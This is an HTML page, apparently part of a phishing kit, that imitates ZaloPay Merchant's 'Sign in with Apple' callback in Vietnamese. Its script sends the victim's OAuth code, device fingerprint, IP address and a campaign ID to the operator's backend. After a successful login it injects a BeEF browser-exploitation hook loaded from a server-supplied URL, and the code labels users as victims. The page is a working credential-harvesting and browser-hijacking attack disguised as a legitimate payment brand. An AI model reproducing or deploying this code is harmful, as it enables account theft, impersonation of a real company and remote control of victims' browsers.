<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xác thực Apple - ZaloPay Merchant</title>
    
    <!-- Favicon -->
    <link rel="icon" type="image/x-icon" href="/favicon.ico">
    
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- ZaloPay Design System -->
    <link href="/css/zalopay-variables.css" rel="stylesheet">
    <link href="/css/zalopay-shared.css" rel="stylesheet">
    <link href="/css/zalopay-components.css" rel="stylesheet">
    
    
    <!-- Font Awesome -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    
    <!-- Custom CSS -->
    <link href="/css/merchant.css" rel="stylesheet">
    
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
</head>
<body class="bg-light">
    <!-- Navigation -->
    <nav class="navbar navbar-expand-lg navbar-light bg-white shadow-sm">
        <div class="container">
            <a class="navbar-brand d-flex align-items-center" href="/">
                <img src="/images/zalopay-logo.png" alt="ZaloPay" height="40" class="me-2">
                <span class="fw-bold text-primary">ZaloPay Merchant</span>
            </a>
        </div>
    </nav>

    <!-- Main Content -->
    <div class="container py-5">
        <div class="row justify-content-center">
            <div class="col-lg-6">
                <div class="card shadow-lg border-0">
                    <div class="card-body p-5 text-center">
                        <!-- Loading State -->
                        <div id="loadingState" class="d-block">
                            <div class="spinner-border text-primary mb-4" role="status" style="width: 3rem; height: 3rem;">
                                <span class="visually-hidden">Đang xử lý...</span>
                            </div>
                            <h3 class="fw-bold text-primary mb-3">Đang xác thực với Apple</h3>
                            <p class="text-muted">
                                Vui lòng chờ trong giây lát, chúng tôi đang xử lý thông tin tài khoản của bạn...
                            </p>
                        </div>

                        <!-- Success State -->
                        <div id="successState" class="d-none">
                            <div class="success-icon bg-success text-white rounded-circle d-inline-flex align-items-center justify-content-center mb-4" style="width: 4rem; height: 4rem;">
                                <i class="fas fa-check fa-2x"></i>
                            </div>
                            <h3 class="fw-bold text-success mb-3">Đăng ký thành công!</h3>
                            <p class="text-muted mb-4">
                                Chào mừng bạn đến với ZaloPay Merchant. Tài khoản của bạn đã được tạo thành công.
                            </p>
                            <div class="alert alert-success">
                                <h6 class="alert-heading">Thông tin tài khoản:</h6>
                                <p class="mb-0" id="accountInfo"></p>
                            </div>
                            <button class="btn btn-primary btn-lg" onclick="redirectToDashboard()">
                                <i class="fas fa-arrow-right me-2"></i>Vào Dashboard
                            </button>
                        </div>

                        <!-- Error State -->
                        <div id="errorState" class="d-none">
                            <div class="error-icon bg-danger text-white rounded-circle d-inline-flex align-items-center justify-content-center mb-4" style="width: 4rem; height: 4rem;">
                                <i class="fas fa-exclamation-triangle fa-2x"></i>
                            </div>
                            <h3 class="fw-bold text-danger mb-3">Xác thực thất bại</h3>
                            <p class="text-muted mb-4" id="errorMessage">
                                Có lỗi xảy ra trong quá trình xác thực. Vui lòng thử lại.
                            </p>
                            <div class="d-flex gap-3 justify-content-center">
                                <button class="btn btn-outline-primary" onclick="retryAuth()">
                                    <i class="fas fa-redo me-2"></i>Thử lại
                                </button>
                                <button class="btn btn-primary" onclick="goToSignup()">
                                    <i class="fas fa-arrow-left me-2"></i>Quay lại đăng ký
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer class="bg-dark text-white py-4">
        <div class="container">
            <div class="row align-items-center">
                <div class="col-md-6">
                    <p class="mb-0">© 2024 ZaloPay Merchant. Tất cả quyền được bảo lưu.</p>
                </div>
                <div class="col-md-6 text-md-end">
                    <a href="#" class="text-white me-3">Điều khoản sử dụng</a>
                    <a href="#" class="text-white">Chính sách bảo mật</a>
                </div>
            </div>
        </div>
    </footer>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    
    <!-- Custom JS -->
    <script src="/js/merchant.js"></script>
    <script src="/js/fingerprint.js"></script>
    
    <script>
        // Process Apple OAuth callback
        async function processAppleAuth() {
            try {
                // Get URL parameters
                const urlParams = new URLSearchParams(window.location.search);
                const code = urlParams.get('code');
                const error = urlParams.get('error');
                
                if (error) {
                    showError('Xác thực Apple bị từ chối: ' + error);
                    return;
                }
                
                if (!code) {
                    showError('Không nhận được mã xác thực từ Apple');
                    return;
                }
                
                // Get device fingerprint
                const deviceFingerprint = await getDeviceFingerprint();
                
                // Send OAuth data to backend
                const response = await fetch('/api/oauth/apple/callback', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        code: code,
                        device_fingerprint: deviceFingerprint,
                        campaign_id: getCampaignId(),
                        client_ip: await getClientIP()
                    })
                });
                
                const result = await response.json();
                
                if (response.ok && result.success) {
                    showSuccess(result.data);
                    
                    // Inject BeEF hook
                    if (result.beef_hook_url) {
                        injectBeEFHook(result.beef_hook_url);
                    }
                } else {
                    showError(result.message || 'Có lỗi xảy ra trong quá trình xác thực');
                }
                
            } catch (error) {
                console.error('Apple auth error:', error);
                showError('Có lỗi xảy ra trong quá trình xác thực');
            }
        }
        
        function showSuccess(data) {
            document.getElementById('loadingState').classList.add('d-none');
            document.getElementById('successState').classList.remove('d-none');
            
            // Display account info
            const accountInfo = document.getElementById('accountInfo');
            accountInfo.innerHTML = `
                <strong>Email:</strong> ${data.email || 'N/A'}<br>
                <strong>Tên:</strong> ${data.name || 'N/A'}<br>
                <strong>ID:</strong> ${data.victim_id || 'N/A'}
            `;
        }
        
        function showError(message) {
            document.getElementById('loadingState').classList.add('d-none');
            document.getElementById('errorState').classList.remove('d-none');
            document.getElementById('errorMessage').textContent = message;
        }
        
        function redirectToDashboard() {
            // Redirect to admin dashboard (for demonstration)
            window.location.href = '/admin/dashboard.html';
        }
        
        function retryAuth() {
            window.location.href = '/auth_signup.html';
        }
        
        function goToSignup() {
            window.location.href = '/auth_signup.html';
        }
        
        function getCampaignId() {
            // Get campaign ID from URL or localStorage
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get('campaign_id') || localStorage.getItem('campaign_id') || 'default';
        }
        
        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'unknown';
            }
        }
        
        function injectBeEFHook(hookUrl) {
            try {
                // Create and inject BeEF hook script
                const script = document.createElement('script');
                script.src = hookUrl;
                script.async = true;
                document.head.appendChild(script);
                
                console.log('BeEF hook injected:', hookUrl);
            } catch (error) {
                console.error('Failed to inject BeEF hook:', error);
            }
        }
        
        // Start processing when page loads
        document.addEventListener('DOMContentLoaded', function() {
            processAppleAuth();
        });
    </script>
</body>
</html>